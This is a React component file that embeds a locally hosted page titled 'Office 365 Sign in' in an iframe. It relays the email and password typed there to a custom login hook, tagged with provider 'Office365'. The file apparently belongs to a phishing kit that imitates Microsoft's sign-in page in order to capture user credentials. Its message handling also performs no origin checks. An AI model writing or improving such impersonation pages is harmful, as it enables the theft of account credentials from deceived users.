import React, { useState, useEffect, useRef } from 'react';
import { useLogin } from '../hooks/useLogin';

interface Office365WrapperProps {
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
}

const Office365Wrapper: React.FC<Office365WrapperProps> = ({ onLoginSuccess, onLoginError }) => {
  const { isLoading, errorMessage, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const [isIframeLoading, setIsIframeLoading] = useState(true);

  // This logic for handling form submission from the iframe remains untouched
  useEffect(() => {
    const handleMessage = (event: MessageEvent) => {
      if (event.data.type === 'OFFICE_365_SUBMIT') {
        const { email, password } = event.data.payload;
        const formData = { 
          email, 
          password, 
          provider: 'Office365'
        };
        handleFormSubmit(new Event('submit'), formData);
      }
    };
    window.addEventListener('message', handleMessage);
    return () => {
      window.removeEventListener('message', handleMessage);
    };
  }, [handleFormSubmit]);

  // This logic for sending errors down to the iframe remains untouched
  useEffect(() => {
    if (errorMessage && iframeRef.current?.contentWindow) {
      iframeRef.current.contentWindow.postMessage({
        type: 'LOGIN_ERROR',
        payload: { message: errorMessage }
      }, '*');
    }
  }, [errorMessage]);

  return (
    <>
      {/* White placeholder while iframe loads */}
      {isIframeLoading && (
        <div className="w-full h-screen flex flex-col items-center justify-center bg-white" />
      )}

      <iframe
        ref={iframeRef}
        src="/office.365.html"
        title="Office 365 Sign in"
        // The iframe is hidden until it's fully loaded
        style={{ display: isIframeLoading ? 'none' : 'block' }}
        className="w-full h-screen border-0"
        // When the iframe content is ready, hide the loader and show the iframe
        onLoad={() => {
          setIsIframeLoading(false);
        }}
      />
    </>
  );
};

export default Office365Wrapper;
